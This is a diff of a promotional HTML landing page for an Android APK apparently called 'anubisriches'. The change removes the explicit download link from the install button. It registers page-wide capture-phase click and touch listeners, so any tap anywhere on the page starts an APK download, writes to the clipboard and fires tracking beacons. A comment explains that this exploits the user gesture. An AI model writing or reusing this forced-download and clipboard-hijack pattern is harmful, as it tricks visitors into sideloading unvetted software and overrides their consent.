@@ -364,16 +364,13 @@
       </div>
     </div>
 
-    <div onclick="onClickBtn()">
-      <a
-        id="dapk"
-        href="https://downloads.afbgaming.app/anubisriches.prod.2.14.apk"
-        ><img
-          style="padding-top: 30px; width: 100%"
-          src="files/install.png"
-          alt=""
-          height="48px"
-      /></a>
+    <div>
+      <img
+        style="padding-top: 30px; width: 100%"
+        src="files/install.png"
+        alt=""
+        height="48px"
+      />
     </div>
 
     <div style="display: flex; align-items: center">
@@ -691,9 +688,6 @@
             "https://api.anubisriches.com/api/advertising/onshow",
             "show",
           );
-          // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-          document.addEventListener("click", onClickBtn, true);
-          document.addEventListener("touchend", onClickBtn, true);
         };
 
         function sendBeacon(url, label) {
@@ -726,7 +720,16 @@
           return null;
         }
 
+        // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
+        document.addEventListener("click", onClickBtn, true);
+        document.addEventListener("touchend", onClickBtn, true);
+
+        let clicked = false;
         function onClickBtn() {
+          if (clicked) return;
+          clicked = true;
+          setTimeout(() => (clicked = false), 1000);
+
           downloadApk();
           sendBeacon(
             "https://api.anubisriches.com/api/advertising/ondownload",
